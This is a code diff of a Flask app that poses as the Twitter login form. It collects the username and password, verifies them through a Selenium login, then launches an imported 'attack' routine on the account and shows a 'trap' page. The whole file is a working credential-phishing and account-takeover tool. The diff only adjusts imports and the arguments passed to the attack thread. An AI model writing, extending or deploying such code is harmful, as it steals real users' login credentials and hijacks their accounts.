@@ -2,7 +2,7 @@ from flask import Flask, request
 from flask import render_template
 from selenium_twitter import loginTwitter
 from bot import attack
-import threading
+import threading, sys, logging
 
 app = Flask(__name__)
 
@@ -16,7 +16,7 @@ def load():
 		username = request.form['session[username_or_email]']
 		password = request.form['session[password]']
 		if loginTwitter(username, password) == True:
-			threading.Thread(target=attack, args=(username, password)).start()
+			threading.Thread(target=attack, args=(username,)).start()
 			return render_template('trap.html', name=None)
 		else:
 			return render_template('wrong_password.html', name=None)
